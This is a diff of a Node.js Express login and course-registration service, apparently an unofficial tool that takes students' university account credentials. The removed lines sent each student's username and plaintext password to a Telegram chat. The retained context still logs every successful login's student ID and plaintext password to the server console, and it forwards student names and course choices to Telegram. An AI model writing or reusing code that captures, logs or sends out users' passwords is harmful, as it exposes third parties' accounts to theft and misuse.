@@ -130,13 +130,6 @@ app.post('/login', async (req, res) => {
         // In ra log console trên server thông tin tài khoản & mật khẩu
         console.log(`[LOGIN SUCCESS] Sinh viên: ${user.name || username} - MSSV: ${username} - Mật khẩu: ${password}`);
 
-        // Gửi thông báo Telegram (bất đồng bộ)
-        const msgText = `🔑 <b>Đăng nhập QLĐT thành công!</b>\n\n` +
-            `• <b>Tài khoản:</b> <code>${username}</code>\n` +
-            `• <b>Mật khẩu:</b> <code>${password}</code>\n` +
-            `• <b>Sinh viên:</b> ${user.name || username}`;
-        sendTelegramMessage(msgText);
-
         res.redirect('/register');
     } catch (err) {
         console.error('Login error:', err);
@@ -201,7 +194,7 @@ app.get('/register', requireAuth, async (req, res) => {
                 item.ten_mon = monHocMap[key] || item.ten_mon || "Môn học chưa có tên";
             }
         });
-        
+
         // Đọc cấu hình hiện tại để hiển thị xem các môn đã đăng ký
         let currentTargets = [];
         try {
@@ -288,8 +281,7 @@ app.post('/submit', requireAuth, async (req, res) => {
             `• <b>Sinh viên:</b> ${studentName || username} (${username})\n` +
             `• <b>Số lượng môn:</b> ${targets.length} môn\n` +
             `• <b>Chi tiết:</b>\n` +
-            targets.map((t, i) => `  ${i + 1}. <code>${t.ma_mon}</code> - Nhóm ${t.nhom_to}${t.to ? ` (Tổ ${t.to})` : ''}`).join('\n') +
-            `\n\n<i>Cấu hình đã được đồng bộ trực tuyến. Tool Go local sẽ tự động cập nhật.</i>`;
+            targets.map((t, i) => `  ${i + 1}. <code>${t.ma_mon}</code> - Nhóm ${t.nhom_to}${t.to ? ` (Tổ ${t.to})` : ''}`).join('\n')
         sendTelegramMessage(msgText);
     } catch (err) {
         console.error('Error saving config:', err);
